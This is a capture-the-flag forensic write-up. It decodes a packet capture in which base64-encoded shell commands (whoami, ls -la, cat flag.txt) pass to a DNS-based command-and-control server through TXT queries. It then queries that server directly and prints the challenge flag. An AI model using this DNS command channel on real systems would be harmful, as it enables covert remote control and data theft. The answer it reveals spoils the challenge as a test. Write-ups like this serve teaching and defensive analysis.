# Do Not Stop

```text
One of my servers was compromised, but I can't figure it out. See if you can solve it for me!

by masond
```

## Summary

* Forensic
* Network
* Guessing

## Background Knowledges

* [Use `dig` to Perform Manual DNS Queries - Linode](https://www.linode.com/docs/networking/dns/use-dig-to-perform-manual-dns-queries/)

## Tools

* Wireshark
* `dig`
* Cryptii

## Description

* Found an evidence of compromising in `capture.pcap`(./capture.pcap).
  * ![1-1](./1-1.png?raw=true)
    * `DNS query @35.225.16.21 A dns.google.com`
      * `DNS query response A dns.google.com -> 35.188.185.68`
    * `DNS query @35.225.16.21 AAAA dns.google.com`
      * `DNS query response A dns.google.com -> 35.188.185.68`
    * `DNS query @35.188.185.68 TXT d2hvYW1pCg==`(`TXT whoami`)
      * `DNS query response TXT d2hvYW1pCg== cm9vdA==`(`root`)
    * `DNS query @35.188.185.68 TXT bHMgLWxhCg==`(`TXT ls -la`)
      * `DNS query response TXT bHMgLWxhCg== dG90YWwgMjUx...`
      * ![1-2](./1-2.png?raw=true)
        * We need to send `cat flag.txt` to dns-server to get flag.
* The address of dns-server(`dns.google.com -> 35.188.185.68`) in `capture.pcap`(./capture.pcap) is not valid. So I just send dns query manually to find out the valid address of dns-server.
  * ![2-1](./2-1.png?raw=true)
    * `DNS query @35.225.16.21 A dns.google.com`
      * `DNS query response A dns.google.com -> 3.88.57.227` -> Gotcha!
* Send get-the-flag command query to dns-server and get the flag.
  * ![3-1](./3-1.png?raw=true)
    * `DNS query @3.88.57.227 TXT Y2F0IGZsYWcudHh0`(`TXT cat flag.txt`)
      * `DNS query response TXT Y2F0IGZsYWcudHh0 dXRmbGFneyRhbDF5X3MzTDFTX3NFNF9kTiR9`
  * ![3-2](./3-2.png?raw=true)
    * We got the flag.
* `utflag{$al1y_s3L1S_sE4_dN$}`
